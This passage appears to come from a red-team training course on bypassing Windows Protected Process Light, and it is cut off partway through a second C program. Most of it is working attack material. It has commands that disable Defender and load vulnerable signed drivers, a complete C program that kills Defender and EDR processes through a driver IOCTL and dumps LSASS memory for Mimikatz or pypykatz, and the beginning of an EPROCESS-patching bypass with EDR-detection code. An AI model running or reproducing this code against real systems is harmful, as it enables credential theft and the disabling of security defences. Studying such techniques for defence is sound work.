## Day 3: PPL Bypass and Protected Process Exploitation

- **Goal**: Understand Protected Process Light architecture and implement bypass techniques for credential theft.
- **Activities**:
  - _Reading_:
    - [Protected Processes Light](https://learn.microsoft.com/en-us/windows/win32/services/protecting-anti-malware-services-)
    - [itm4n - Ghost in the PPL](https://itm4n.github.io/lsass-runasppl/) - Deep technical dive into PPL
    - [Bypassing Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
  - _Online Resources_:
    - [ PPLdump Is Dead. Long Live PPLdump](https://www.youtube.com/watch?v=5xteW8Tm410)
    - [PPLdump Tool](https://github.com/itm4n/PPLdump) - Archived PPL bypass tool
    - [PPLKiller](https://github.com/RedCursorSecurityConsulting/PPLKiller) - Older Kernel-based bypass
  - _Tool Setup_:
    - Mimikatz (for credential extraction)
    - WinDbg (kernel debugging)
    - pypykatz (pure Python credential extraction)
  - _Exercise_:
    - Enumerate PPL-protected processes
    - Implement PPL status checker
    - Use PPLdump to bypass LSASS protection
    - Extract credentials with Mimikatz/pypykatz

### Context: Why PPL Blocks Your Attack

Windows uses PPL to protect:

- **LSASS** (credential storage)
- **Windows Defender** (MsMpEng.exe)
- **csrss.exe** (critical system process)

Even as Administrator, you cannot inject into or dump memory from PPL processes. Red teamers need to bypass this.

### Lab Setup: Two Approaches to PPL Bypass

#### Prerequisites

1. **Isolated Lab Environment**
   - Windows 10/11 VM (VMware, VirtualBox, or Hyper-V)
   - NOT connected to production networks
   - Snapshot the VM before proceeding

2. **Administrator Privileges**
   - Run PowerShell or CMD as Administrator

3. **Disable Security Features (Lab Only!)**

   ```bash
   # Disable Windows Defender (temporary, for lab)
   Set-MpPreference -DisableRealtimeMonitoring $true

   # Check if HVCI is enabled (blocks unsigned drivers)
   Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | Select-Object -ExpandProperty SecurityServicesRunning
   # If HVCI (2) is listed, you need to disable it or use test signing
   ```

#### Option A: Using Process Termination Drivers

**Step 1: Download Drivers from LOLDrivers**

```bash
# Create drivers directory
New-Item -ItemType Directory -Path "C:\Windows_Mitigations_Lab\drivers" -Force
cd C:\Windows_Mitigations_Lab\drivers

# Download K7RKScan.sys (K7 Computing - CVE-2025-52915)
Invoke-WebRequest -Uri "https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/b16e217cdca19e00c1b68bdfb28ead53b20adeabd6edcd91542f9fbf48942877.bin" -OutFile "K7RKScan.sys"

# Download ksapi64.sys (Kingsoft)
Invoke-WebRequest -Uri "https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/a7681a49d1ac6efb31409f17a7011a8b.bin" -OutFile "ksapi64.sys"

# Download BdApiUtil64.sys (Baidu)
Invoke-WebRequest -Uri "https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/29e1264dd642b646fbef9bd347b1b860.bin" -OutFile "BdApiUtil64.sys"

# Download wamsdk.sys (WatchDog - newest, 2025)
Invoke-WebRequest -Uri "https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/b6b51508ad6f462c45fe102c85d246c8.bin" -OutFile "wamsdk.sys"

# Verify signatures
Get-AuthenticodeSignature .\*.sys
```

**Understanding the Attack Flow**

```text
┌─────────────────────────────────────────────────────────────────┐
│              PPL Bypass Attack Strategies                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  STRATEGY 1: Kill EDR/AV -> Dump LSASS (Recommended)             │
│  ─────────────────────────────────────────────────              │
│  1. Use process termination driver to kill:                     │
│     - MsMpEng.exe (Windows Defender) - PPL-Antimalware          │
│     - CrowdStrike, SentinelOne, Carbon Black agents             │
│     - These are PPL but NOT critical processes                  │
│  2. With EDR dead, dump LSASS normally:                         │
│     - MiniDumpWriteDump() now succeeds                          │
│     - No hooks to detect the dump                               │
│                                                                 │
│  STRATEGY 2: Crash System -> Extract from Dump                   │
│  ─────────────────────────────────────────────                  │
│  1. Enable crash dumps: CrashDumpEnabled = 1                    │
│  2. Kill LSASS -> System crashes                                 │
│  3. After reboot, parse C:\Windows\MEMORY.DMP                   │
│  4. Use volatility3: windows.hashdump                           │
│                                                                 │
│  STRATEGY 3: EPROCESS Patching (Best for LSASS)                 │
│  ─────────────────────────────────────────────                  │
│  1. Use memory R/W driver (RTCore64, DBUtil)                    │
│  2. Find LSASS EPROCESS in kernel memory                        │
│  3. Zero the Protection field                                   │
│  4. Dump LSASS normally - no crash!                             │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Step 2: Load and Use BdApiUtil64.sys**

```bash
# Copy to drivers folder
Copy-Item "C:\Windows_Mitigations_Lab\drivers\BdApiUtil64.sys" -Destination "C:\Windows\System32\drivers\BdApiUtil64.sys"

# Create and start service
sc.exe create BdApiUtil64 type=kernel binPath="C:\Windows\System32\drivers\BdApiUtil64.sys"
sc.exe start BdApiUtil64

# Verify it's running
sc.exe query BdApiUtil64
```

#### Option B: Using RTCore64.sys for Memory R/W

**Step 1: Load RTCore64.sys**

```bash
# Download RTCore64.sys
Invoke-WebRequest -Uri "https://github.com/Processus-Thief/PsNotifRoutineUnloader/raw/main/RTCore64.sys" -OutFile "C:\Windows_Mitigations_Lab\drivers\RTCore64.sys"

# Copy and load
Copy-Item "C:\Windows_Mitigations_Lab\drivers\RTCore64.sys" -Destination "C:\Windows\System32\drivers\RTCore64.sys"
sc.exe create RTCore64 type=kernel binPath="C:\Windows\System32\drivers\RTCore64.sys"
sc.exe start RTCore64

# Verify
sc.exe query RTCore64
```

**Cleanup After Testing**

```bash
# Stop and remove all test drivers
$drivers = @("K7RKScan", "ksapi64", "BdApiUtil64", "wamsdk", "RTCore64")
foreach ($drv in $drivers) {
    sc.exe stop $drv 2>$null
    sc.exe delete $drv 2>$null
    Remove-Item "C:\Windows\System32\drivers\$drv.sys" -Force -ErrorAction SilentlyContinue
}

# Disable test signing
bcdedit /set testsigning off
bcdedit /set nointegritychecks off

# Re-enable Defender
Set-MpPreference -DisableRealtimeMonitoring $false

Restart-Computer
```

### Deliverables

- [ ] Understand PPL architecture and signer levels
- [ ] Analyze PPL bypass techniques (BYOVDLL, kernel)
- [ ] Implement or use existing PPL bypass tools
- [ ] Successfully dump LSASS with PPL enabled

### PPL Architecture

```text
┌─────────────────────────────────────────────────────────────────┐
│                 Protected Process Light (PPL)                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  PPL Signer Levels (highest to lowest):                         │
│  ─────────────────────────────────────                          │
│  WinSystem (7)      - Highest, kernel-level                     │
│  WinTcb (6)         - Trusted Computer Base                     │
│  Windows (5)        - Windows components                        │
│  Lsa (4)            - LSASS specifically                        │
│  Antimalware (3)    - AV/EDR processes                          │
│  Authenticode (2)   - Signed by trusted CA                      │
│  CodeGen (1)        - .NET native images                        │
│  None (0)           - No protection                             │
│                                                                 │
│  Access Control:                                                │
│  ├── Lower PPL cannot access higher PPL                         │
│  ├── Non-PPL cannot access any PPL                              │
│  └── Even Admin cannot inject into PPL processes                │
└─────────────────────────────────────────────────────────────────┘
```

### PPL Check Tool

```c
// ppl_checker.c - Check PPL status of processes
// Compile: cl src\ppl_checker.c /Fe:bin\ppl_check.exe advapi32.lib
// Run as Administrator!

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

typedef enum _PS_PROTECTED_TYPE {
    PsProtectedTypeNone = 0,
    PsProtectedTypeProtectedLight = 1,
    PsProtectedTypeProtected = 2
} PS_PROTECTED_TYPE;

typedef enum _PS_PROTECTED_SIGNER {
    PsProtectedSignerNone = 0,
    PsProtectedSignerAuthenticode = 1,
    PsProtectedSignerCodeGen = 2,
    PsProtectedSignerAntimalware = 3,
    PsProtectedSignerLsa = 4,
    PsProtectedSignerWindows = 5,
    PsProtectedSignerWinTcb = 6,
    PsProtectedSignerWinSystem = 7,
    PsProtectedSignerMax = 8
} PS_PROTECTED_SIGNER;

typedef struct _PS_PROTECTION {
    union {
        UCHAR Level;
        struct {
            UCHAR Type : 3;
            UCHAR Audit : 1;
            UCHAR Signer : 4;
        };
    };
} PS_PROTECTION;

typedef NTSTATUS (NTAPI *NtQueryInformationProcess_t)(
    HANDLE ProcessHandle,
    ULONG ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

#define ProcessProtectionInformation 61

const char* GetSignerName(UCHAR signer) {
    switch (signer) {
        case 0: return "None";
        case 1: return "Authenticode";
        case 2: return "CodeGen";
        case 3: return "Antimalware";
        case 4: return "Lsa";
        case 5: return "Windows";
        case 6: return "WinTcb";
        case 7: return "WinSystem";
        default: return "Unknown";
    }
}

const char* GetTypeName(UCHAR type) {
    switch (type) {
        case 0: return "None";
        case 1: return "PPL";
        case 2: return "PP";
        default: return "Unknown";
    }
}

BOOL IsElevated() {
    BOOL elevated = FALSE;
    HANDLE token = NULL;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD size;
        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size)) {
            elevated = elevation.TokenIsElevated;
        }
        CloseHandle(token);
    }
    return elevated;
}

void CheckProcessPPL(DWORD pid, const char* name) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProcess) {
        return;
    }

    NtQueryInformationProcess_t NtQueryInformationProcess =
        (NtQueryInformationProcess_t)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");

    if (!NtQueryInformationProcess) {
        CloseHandle(hProcess);
        return;
    }

    PS_PROTECTION protection = {0};
    ULONG returnLength;

    NTSTATUS status = NtQueryInformationProcess(
        hProcess, ProcessProtectionInformation,
        &protection, sizeof(protection), &returnLength);

    if (status == 0 && protection.Level != 0) {
        printf("[%s] %s (PID %d): Signer=%s Level=0x%02X\n",
            GetTypeName(protection.Type), name, pid,
            GetSignerName(protection.Signer), protection.Level);
    }

    CloseHandle(hProcess);
}

int main() {
    printf("=== PPL Process Scanner ===\n\n");

    if (!IsElevated()) {
        printf("[!] WARNING: Not running as Administrator!\n");
        printf("[!] You may not see all protected processes.\n");
        printf("[!] Run as Administrator for complete results.\n\n");
    }

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to create process snapshot: %d\n", GetLastError());
        return 1;
    }

    PROCESSENTRY32 pe = { sizeof(pe) };

    printf("Scanning for protected processes...\n\n");

    int count = 0;
    if (Process32First(hSnapshot, &pe)) {
        do {
            CheckProcessPPL(pe.th32ProcessID, pe.szExeFile);
            count++;
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);

    printf("\n[*] Scanned %d processes\n", count);
    printf("[*] To dump LSASS, you need to bypass PPL-Lsa protection\n");
    printf("[*] Options: BYOVD, kernel driver, or PPL bypass techniques\n");

    return 0;
}
```

**Compile and Run**:

```bash
cl src\ppl_checker.c /Fe:bin\ppl_check.exe advapi32.lib
# run from admin powershell
.\bin\ppl_check.exe
```

#### Enabling LSASS PPL Protection

The exploit demonstrates PPL bypass, but LSASS must be running as PPL first. If you see `Current PPL protection: 0x00`, enable it:

**Enable RunAsPPL via Registry:**

```powershell
# Enable LSASS PPL protection
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f

# Verify the setting
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL

# Reboot required
shutdown /r /t 0
```

**After reboot, verify PPL is active:**

```powershell
# Run the analyzer tool
.\bin\ppl_target_analyzer.exe

# You should see LSASS with:
# Type: Protected Light (PPL)
# Signer: Lsa (LSASS PPL)
# Level: 0x41
```

**Disable PPL (for testing):**

```powershell
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /f
shutdown /r /t 0
```

### Method 1: BdApiUtil64.sys (Baidu)

To check if PPL is enabled:

```bash
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL"
```

```c
// defender_killer_lsass_dump.c
// Compile: cl src\defender_killer_lsass_dump.c /Fe:bin\defender_killer.exe advapi32.lib dbghelp.lib
//
// Driver: BdApiUtil64.sys (Baidu AntiVirus)
// IOCTL: 0x800024B4 - Terminates any process by PID
// Device: \\.\BdApiUtil
//
// ATTACK FLOW:
//   1. Load BdApiUtil.sys (validly signed, no test signing!)
//   2. Kill Windows Defender (MsMpEng.exe) - PPL but not critical
//   3. Kill other EDR processes if present
//   4. Dump LSASS with MiniDumpWriteDump
//   5. Credentials can be extracted with pypykatz
//
// USAGE:
//   1. Download BdApiUtil64.sys from LOLDrivers
//   2. Place in same directory as this executable
//   3. Run as Administrator
//   4. Parse lsass.dmp with: pypykatz lsa minidump lsass.dmp

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <dbghelp.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "dbghelp.lib")

// BdApiUtil driver constants
#define BDAPI_DEVICE     L"\\\\.\\BdApiUtil"
#define BDAPI_IOCTL      0x800024B4
#define BDAPI_SVC_NAME   L"BdApiUtil64"
#define BDAPI_FILENAME   L"BdApiUtil64.sys"

// EDR/AV targets - PPL protected but NOT critical (safe to kill)
const wchar_t* g_edr_targets[] = {
    L"MsMpEng.exe",           // Windows Defender - PRIMARY TARGET
    L"MsSense.exe",           // Defender ATP
    L"SenseCncProxy.exe",     // Defender ATP
    L"SenseIR.exe",           // Defender ATP
    L"SecurityHealthService.exe", // Windows Security
    L"smartscreen.exe",       // SmartScreen
    NULL
};

// Global driver handle
HANDLE g_hDriver = INVALID_HANDLE_VALUE;

BOOL IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&ntAuth, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                  DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin;
}

DWORD FindProcessByName(const wchar_t* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD pid = 0;

    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, processName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return pid;
}

BOOL LoadBdApiDriver(const wchar_t* driverPath) {
    SC_HANDLE hSCManager = NULL;
    SC_HANDLE hService = NULL;
    BOOL success = FALSE;

    printf("[*] Opening Service Control Manager...\n");
    hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCManager) {
        printf("[-] OpenSCManager failed: %d\n", GetLastError());
        return FALSE;
    }

    // Try to open existing service first
    hService = OpenServiceW(hSCManager, BDAPI_SVC_NAME, SERVICE_ALL_ACCESS);

    if (!hService) {
        printf("[*] Creating service for BdApiUtil...\n");
        hService = CreateServiceW(
            hSCManager,
            BDAPI_SVC_NAME,
            BDAPI_SVC_NAME,
            SERVICE_ALL_ACCESS,
            SERVICE_KERNEL_DRIVER,
            SERVICE_DEMAND_START,
            SERVICE_ERROR_NORMAL,
            driverPath,
            NULL, NULL, NULL, NULL, NULL
        );

        if (!hService) {
            printf("[-] CreateService failed: %d\n", GetLastError());
            CloseServiceHandle(hSCManager);
            return FALSE;
        }
        printf("[+] Service created\n");
    } else {
        printf("[*] Service already exists\n");
    }

    // Start the service
    printf("[*] Starting driver...\n");
    if (!StartServiceW(hService, 0, NULL)) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_ALREADY_RUNNING) {
            printf("[*] Driver already running\n");
            success = TRUE;
        } else {
            printf("[-] StartService failed: %d\n", err);
        }
    } else {
        printf("[+] Driver started successfully\n");
        success = TRUE;
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return success;
}

BOOL OpenDriverDevice() {
    printf("[*] Opening driver device...\n");

    g_hDriver = CreateFileW(
        BDAPI_DEVICE,
        GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (g_hDriver == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open device %ls: %d\n", BDAPI_DEVICE, GetLastError());
        return FALSE;
    }

    printf("[+] Device opened: %ls\n", BDAPI_DEVICE);
    return TRUE;
}

BOOL KillProcess(DWORD pid) {
    if (g_hDriver == INVALID_HANDLE_VALUE) {
        printf("[-] Driver not opened\n");
        return FALSE;
    }

    DWORD bytesReturned = 0;
    DWORD outputBuffer = 0;

    BOOL success = DeviceIoControl(
        g_hDriver,
        BDAPI_IOCTL,
        &pid, sizeof(DWORD),
        &outputBuffer, sizeof(DWORD),
        &bytesReturned,
        NULL
    );

    return success;
}

int KillEdrProcesses() {
    int killed = 0;

    printf("\n[*] Scanning for EDR/AV processes...\n");

    for (int i = 0; g_edr_targets[i] != NULL; i++) {
        DWORD pid = FindProcessByName(g_edr_targets[i]);
        if (pid) {
            printf("  [*] Found %ls (PID %d) - Killing... ", g_edr_targets[i], pid);
            if (KillProcess(pid)) {
                printf("SUCCESS\n");
                killed++;
            } else {
                printf("FAILED (error %d)\n", GetLastError());
            }
        }
    }

    return killed;
}

// Fast raw memory dump - bypasses MiniDumpWriteDump completely
BOOL FastDumpLsass(DWORD lsassPid, const wchar_t* outputPath) {
    printf("[*] Fast raw memory dump to %ls...\n", outputPath);

    HANDLE hLsass = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, lsassPid);
    if (!hLsass) {
        printf("[-] Failed to open LSASS: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] Opened LSASS for reading\n");

    HANDLE hFile = CreateFileW(outputPath, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create file: %d\n", GetLastError());
        CloseHandle(hLsass);
        return FALSE;
    }

    // Allocate 1MB buffer
    BYTE* buffer = (BYTE*)VirtualAlloc(NULL, 1024 * 1024, MEM_COMMIT, PAGE_READWRITE);
    if (!buffer) {
        printf("[-] Failed to allocate buffer\n");
        CloseHandle(hFile);
        CloseHandle(hLsass);
        return FALSE;
    }

    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T address = 0;
    SIZE_T total_dumped = 0;
    int regions = 0;
    DWORD start_time = GetTickCount();

    printf("[*] Scanning memory regions: ");

    while (VirtualQueryEx(hLsass, (LPCVOID)address, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        // Only dump committed readable memory
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE)) &&
            !(mbi.Protect & PAGE_GUARD)) {

            SIZE_T bytes_read = 0;
            if (ReadProcessMemory(hLsass, (LPCVOID)address, buffer, mbi.RegionSize, &bytes_read)) {
                DWORD bytes_written;
                WriteFile(hFile, buffer, (DWORD)bytes_read, &bytes_written, NULL);
                total_dumped += bytes_read;
                regions++;

                if (regions % 10 == 0) {
                    printf(".");
                    fflush(stdout);
                }
            }
        }

        address += mbi.RegionSize;
        if (address >= 0x7FFFFFFFFFFF) break;
    }

    VirtualFree(buffer, 0, MEM_RELEASE);
    CloseHandle(hFile);
    CloseHandle(hLsass);

    DWORD elapsed = (GetTickCount() - start_time) / 1000;
    if (elapsed == 0) elapsed = 1;

    printf("\n[+] Raw dump completed\n");
    printf("    Regions: %d\n", regions);
    printf("    Size: %.2f MB\n", total_dumped / (1024.0 * 1024.0));
    printf("    Time: %d seconds (%.2f MB/s)\n", elapsed,
           (total_dumped / (1024.0 * 1024.0)) / elapsed);
    printf("\n[!] This is a RAW memory dump, not minidump format\n");
    printf("[!] To extract credentials, use strings or manual parsing\n");
    printf("[!] Example: strings %ls | grep -i password\n", outputPath);

    return TRUE;
}

// Thread wrapper for DumpLsass with timeout support
DWORD WINAPI DumpLsassThread(LPVOID param) {
    const wchar_t* path = (const wchar_t*)param;
    return DumpLsass(path) ? 0 : 1;
}

BOOL DumpLsass(const wchar_t* outputPath) {
    DWORD lsassPid = FindProcessByName(L"lsass.exe");
    if (!lsassPid) {
        printf("[-] LSASS process not found\n");
        return FALSE;
    }

    printf("[*] Found LSASS (PID %d)\n", lsassPid);

    // Open LSASS with full access
    printf("[*] Opening LSASS...\n");
    HANDLE hLsass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsassPid);
    if (!hLsass) {
        DWORD err = GetLastError();
        printf("[-] Failed to open LSASS: %d\n", err);
        if (err == 5) {
            printf("[!] Access Denied - EDR may still be running!\n");
            printf("[!] Or LSASS is PPL protected and EDR wasn't blocking us\n");
        }
        return FALSE;
    }

    printf("[+] Opened LSASS with PROCESS_ALL_ACCESS\n");

    // Create dump file
    printf("[*] Creating dump file: %ls\n", outputPath);
    HANDLE hFile = CreateFileW(
        outputPath,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create dump file: %d\n", GetLastError());
        CloseHandle(hLsass);
        return FALSE;
    }

    // Dump memory
    printf("[*] Dumping LSASS memory...\n");
    BOOL success = MiniDumpWriteDump(
        hLsass,
        lsassPid,
        hFile,
        MiniDumpWithFullMemory,
        NULL,
        NULL,
        NULL
    );

    CloseHandle(hFile);
    CloseHandle(hLsass);

    if (success) {
        // Get file size
        WIN32_FILE_ATTRIBUTE_DATA fileInfo;
        LARGE_INTEGER fileSize = {0};
        if (GetFileAttributesExW(outputPath, GetFileExInfoStandard, &fileInfo)) {
            fileSize.LowPart = fileInfo.nFileSizeLow;
            fileSize.HighPart = fileInfo.nFileSizeHigh;
        }
        printf("[+] LSASS dump created: %ls (%.2f MB)\n",
               outputPath, (double)fileSize.QuadPart / (1024 * 1024));
        return TRUE;
    } else {
        printf("[-] MiniDumpWriteDump failed: %d\n", GetLastError());
        DeleteFileW(outputPath);
        return FALSE;
    }
}

int wmain(int argc, wchar_t* argv[]) {
    wchar_t driverPath[MAX_PATH];
    wchar_t dumpPath[MAX_PATH] = L"lsass.dmp";

    printf("\n");
    printf("==========================================================\n");
    printf("  BdApiUtil PPL Bypass - Kill Defender + Dump LSASS\n");
    printf("  Driver: BdApiUtil64.sys (Baidu - Signed)\n");
    printf("==========================================================\n\n");

    // Check admin
    if (!IsRunningAsAdmin()) {
        printf("[-] ERROR: Must run as Administrator!\n");
        return 1;
    }
    printf("[+] Running as Administrator\n");

    // Build driver path (same directory as executable)
    GetModuleFileNameW(NULL, driverPath, MAX_PATH);
    wchar_t* lastSlash = wcsrchr(driverPath, L'\\');
    if (lastSlash) {
        wcscpy_s(lastSlash + 1, MAX_PATH - (lastSlash - driverPath + 1), BDAPI_FILENAME);
    }

    printf("[*] Driver path: %ls\n", driverPath);

    // Check if driver file exists
    if (GetFileAttributesW(driverPath) == INVALID_FILE_ATTRIBUTES) {
        printf("\n[-] Driver file not found: %ls\n", driverPath);
        printf("\n[*] Download from LOLDrivers:\n");
        printf("    Invoke-WebRequest -Uri \"https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/29e1264dd642b646fbef9bd347b1b860.bin\" -OutFile \"%ls\"\n", BDAPI_FILENAME);
        return 1;
    }
    printf("[+] Driver file found\n");

    // Step 1: Load driver
    printf("\n[STEP 1] Loading BdApiUtil driver...\n");
    if (!LoadBdApiDriver(driverPath)) {
        printf("[-] Failed to load driver\n");
        return 1;
    }

    // Step 2: Open device
    printf("\n[STEP 2] Opening driver device...\n");
    if (!OpenDriverDevice()) {
        printf("[-] Failed to open driver device\n");
        return 1;
    }

    // Step 3: Kill EDR/Defender
    printf("\n[STEP 3] Killing Windows Defender and EDR...\n");
    int killed = KillEdrProcesses();
    printf("\n[+] Killed %d EDR/AV processes\n", killed);

    // Don't wait - Windows restarts Defender immediately!
    // Dump LSASS as fast as possible while Defender is dead
    if (killed > 0) {
        printf("\n[!] Windows will restart Defender immediately - dumping LSASS now!\n");
    }

    // Step 4: Dump LSASS with timeout
    printf("\n[STEP 4] Dumping LSASS memory...\n");
    printf("[*] Attempting standard minidump (30 second timeout)...\n");

    // Try standard dump with timeout
    BOOL dump_success = FALSE;
    HANDLE hDumpThread = CreateThread(NULL, 0,
        DumpLsassThread, (LPVOID)dumpPath, 0, NULL);

    if (hDumpThread) {
        DWORD wait_result = WaitForSingleObject(hDumpThread, 30000); // 30 second timeout

        if (wait_result == WAIT_TIMEOUT) {
            printf("[!] Minidump timed out after 30 seconds\n");
            printf("[*] This indicates VM security monitoring or AV interference\n");
            printf("[*] Falling back to fast raw memory dump...\n");
            TerminateThread(hDumpThread, 1);
            CloseHandle(hDumpThread);

            // Try fast dump instead
            wchar_t rawDumpPath[MAX_PATH];
            wcscpy_s(rawDumpPath, MAX_PATH, dumpPath);
            wcscat_s(rawDumpPath, MAX_PATH, L".raw");

            dump_success = FastDumpLsass(FindProcessByName(L"lsass.exe"), rawDumpPath);
        } else if (wait_result == WAIT_OBJECT_0) {
            DWORD exit_code;
            GetExitCodeThread(hDumpThread, &exit_code);
            dump_success = (exit_code == 0);
            CloseHandle(hDumpThread);
        }
    }

    if (!dump_success) {
        printf("[-] All dump methods failed\n");
        CloseHandle(g_hDriver);
        return 1;
    }

    // Cleanup
    CloseHandle(g_hDriver);

    // Success!
    printf("\n");
    printf("==========================================================\n");
    printf("  SUCCESS! Credentials extracted.\n");
    printf("==========================================================\n");
    printf("\n");
    printf("[*] Parse the dump with pypykatz:\n");
    printf("    pypykatz lsa minidump %ls\n", dumpPath);
    printf("\n");
    printf("[*] Or with Mimikatz:\n");
    printf("    sekurlsa::minidump %ls\n", dumpPath);
    printf("    sekurlsa::logonpasswords\n");
    printf("\n");

    return 0;
}
```

**Compilation and Usage:**

```bash
# Compile the code
cl src\defender_killer_lsass_dump.c /Fe:bin\defender_killer.exe advapi32.lib dbghelp.lib

# Run as Administrator
.\bin\defender_killer.exe

# Parse credentials
pip install pypykatz
pypykatz lsa minidump lsass.dmp
```

### Method 2: EPROCESS Patching (RTCore64.sys)

**Debugging crashes:**

```bash
# Analyze the minidump
windbg -z C:\Windows\Minidump\<dumpfile>.dmp

# In WinDbg:
!analyze -v                   # Get crash details
dt nt!_EPROCESS               # Verify structure offsets for your build
x nt!PsInitialSystemProcess   # Get System EPROCESS address
dt nt!_EPROCESS <address>     # Dump System EPROCESS

# Key offsets to verify:
# UniqueProcessId - should be 0x1D0 or 0x440 for Win11 24H2
# ActiveProcessLinks - should be 0x1D8 or 0x448 for Win11 24H2
# Protection - should be 0x5FA or 0x87A for Win11 24H2
```

if the code below crashed your vm, check with the instructions up there to find the correct offsets

```c
// ppl_bypass_rtcore.c - Strip PPL via EPROCESS patching using RTCore64.sys
// Compile: cl src\ppl_bypass_rtcore.c /Fe:bin\ppl_bypass.exe advapi32.lib ntdll.lib dbghelp.lib psapi.lib
// This uses RTCore64.sys kernel R/W to:
//   1. Leak kernel base address
//   2. Find PsActiveProcessHead
//   3. Walk EPROCESS linked list to find LSASS
//   4. Zero the Protection field to strip PPL
//   5. Dump LSASS with MiniDumpWriteDump
//

#include <windows.h>
#include <stdio.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <psapi.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shlwapi.lib")

typedef struct _ANTI_ANALYSIS_CTX {
    BOOL is_edr_present;
    BOOL is_sandbox;
    BOOL is_vm;
    BOOL is_debugger;
    DWORD stealth_level;
} ANTI_ANALYSIS_CTX;

static ANTI_ANALYSIS_CTX g_anti_ctx = {0};

// Driver vulnerability database
typedef struct _DRIVER_INFO {
    WCHAR name[64];
    WCHAR device_path[256];
    DWORD read_ioctl;
    DWORD write_ioctl;
    DWORD cve_year;
    WCHAR vendor[64];
    BOOL is_loaded;
} DRIVER_INFO;

static DRIVER_INFO g_vulnerable_drivers[] = {
    { L"RTCore64", L"\\\\.\\RTCore64", 0x80002048, 0x8000204C, 2019, L"MSI", FALSE },
    { L"Capcom", L"\\\\.\\Capcom", 0xAA012044, 0xAA012048, 2016, L"Capcom", FALSE },
    { L"GIGABYTE", L"\\\\.\\GIO", 0xDA880234, 0xDA880238, 2018, L"GIGABYTE", FALSE },
    { L"ASUSHWIO", L"\\\\.\\ASUSHWIO64", 0x80002010, 0x80002014, 2020, L"ASUS", FALSE },
    { L"EnTech", L"\\\\.\\EnTech", 0x9C402580, 0x9C402584, 2021, L"EnTech", FALSE }
};

#define DRIVER_COUNT (sizeof(g_vulnerable_drivers) / sizeof(DRIVER_INFO))

// Anti-analysis functions
BOOL DetectEDRPresence() {
    WCHAR* edr_processes[] = {
        L"crowdstrike.exe", L"csfalconservice.exe", L"sentinelagent.exe",
        L"cb.exe", L"carbonblack.exe", L"edrclient.exe",
        L"elasticendpoint.exe", L"mcafeeendpoint.exe", L"symantec.exe"
    };

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
